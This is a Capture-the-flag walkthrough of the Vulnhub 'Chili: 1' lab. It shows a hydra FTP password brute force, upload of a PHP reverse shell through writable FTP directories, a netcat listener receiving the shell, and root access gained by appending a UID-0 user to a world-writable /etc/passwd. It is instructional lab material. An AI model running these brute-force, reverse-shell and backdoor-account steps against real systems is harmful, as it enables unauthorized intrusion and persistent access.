**Vulnhub > Chili 1**

# Description

* Name: Chili: 1
* Date release: 14 Sep 2020
* Author: SunCSR Team
* Series: Chili
* Difficulty: Easy
* Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
* Goal: Get the root shell i.e.(`root@localhost:~#`) and then obtain flag under /root).
* Hint : "If you ever get stuck, try again with the name of the lab"

# Services enumeration

Nmap reveals that 2 services are running on the target: FTP and HTTP.

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Chili
Service Info: OS: Unix
~~~

# FTP

## Brute force chili's account

The FTP service doesn't allow anonymous access. It is fair enough to assume that a `chili` user exists. Let's brute force it with `hydra`:

~~~
kali@kali:/data/Chili-1/files$ hydra -l chili -P /usr/share/wordlists/rockyou.txt ftp://chili.box
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-20 16:55:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://chili.box:21/
[STATUS] 292.00 tries/min, 292 tries in 00:01h, 14344107 to do in 818:44h, 16 active
[STATUS] 289.33 tries/min, 868 tries in 00:03h, 14343531 to do in 826:15h, 16 active
[STATUS] 289.43 tries/min, 2026 tries in 00:07h, 14342373 to do in 825:55h, 16 active
[STATUS] 287.87 tries/min, 4318 tries in 00:15h, 14340081 to do in 830:16h, 16 active
[21][ftp] host: chili.box   login: chili   password: a1b2c3d4
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-20 17:11:22
~~~

Hydra successfully found the password: `a1b2c3d4`. Let's connect as `chili`:

~~~
kali@kali:/data/Chili-1/files$ ftp chili.box
Connected to chili.box.
220 (vsFTPd 3.0.3)
Name (chili.box:kali): chili
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1000     1000         4096 Sep 08 13:15 .
drwxr-xr-x    3 0        0            4096 Sep 08 12:21 ..
-rw-r--r--    1 1000     1000          220 Sep 07 02:50 .bash_logout
-rw-r--r--    1 1000     1000         3526 Sep 07 02:50 .bashrc
drwxr-xr-x    3 1000     1000         4096 Sep 08 12:22 .local
-rw-r--r--    1 1000     1000          807 Sep 07 02:50 .profile
226 Directory send OK.
~~~

## Browse the file system

There is nothing interesting in `chili`'s home directory, but there is no directory limitation, and we are allowed to browse the entire file system:

~~~
ftp> pwd
257 "/home/chili" is the current directory
ftp> cd /var/www/html
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Sep 08 13:12 .
drwxr-xr-x    3 0        0            4096 Sep 08 11:41 ..
drwxrwxrwx    2 0        0            4096 Sep 08 13:14 .nano
drwxr-xr-x    2 0        0            4096 Sep 08 13:12 .vim
-rw-r--r--    1 0        0           74290 Oct 23  2018 Chile_WEB.jpg
-rw-r--r--    1 0        0             657 Sep 08 11:44 index.html
226 Directory send OK.
~~~

## Upload a PHP reverse shell

Besides, it appears that the user is allowed to write files on the server. Let's download a [PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and upload it on the server.

~~~
ftp> put shell.php 
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
553 Could not create file.
~~~

Unfortunately, we can't write at the root of the web server, but there are 2 directories (`.nano` and `.vim`) with write access. Upload the PHP reverse shell and give it appropriate permissions.

~~~
ftp> cd .nano
250 Directory successfully changed.
ftp> put shell.php 
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
20 bytes sent in 0.00 secs (260.4167 kB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Sep 20 11:24 .
drwxr-xr-x    4 0        0            4096 Sep 08 13:12 ..
-rw-r--r--    1 1000     1000            0 Sep 08 13:14 index.html
-rw-------    1 1000     1000           20 Sep 20 11:24 shell.php
226 Directory send OK.
ftp> chmod 644 shell.php
200 SITE CHMOD command ok.
~~~

# Reverse shell

Start a listener (`rlwrap nc -nlvp 4444`) and browse the following URL:

~~~
$ curl http://chili.box/.nano/shell.php
~~~

A reverse shell is now spanwned in our listener window:

~~~
kali@kali:/data/Chili-1/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.130] 45616
Linux chili 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 11:32:49 up 42 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Privilege escalation

Running `linpeas.sh` on the target will spot that the `/etc/passwd` file is world-writable:

~~~
www-data@chili:/tmp$ ls -la /etc/passwd
ls -la /etc/passwd
-rw-r--rw- 1 root root 1450 Sep  8 12:23 /etc/passwd
~~~

Let's create a new user with root privileges:

~~~
www-data@chili:/tmp$ openssl passwd -1 -salt pwn chili
openssl passwd -1 -salt pwn chili
$1$pwn$HyrNVu9H4h183T74U0RD//
www-data@chili:/tmp$ printf 'pwn:$1$pwn$HyrNVu9H4h183T74U0RD//:0:0:root:/root:/bin/bash\n' >> /etc/passwd
<74U0RD//:0:0:root:/root:/bin/bash\n' >> /etc/passwd
~~~

# Root flag

Now, let's connect as `pwn:chili` and get the root flag:

~~~
www-data@chili:/tmp$ su pwn
su pwn
Password: chili

root@chili:/tmp# cd /root
cd /root
root@chili:~# ls -la
ls -la
total 32
drwx------  3 root root 4096 Sep  8 13:15 .
drwxr-xr-x 18 root root 4096 Sep  7 02:47 ..
-rw-------  1 root root  126 Sep  8 13:15 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Sep  8 11:43 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   47 Sep  8 12:26 proof.txt
-rw-r--r--  1 root root  176 Sep  8 11:43 .wget-hsts
root@chili:~# cat proof.txt
cat proof.txt
Sun_CSR.Chili.af6d45da1f1181347b9e2139f23c6a5b
~~~
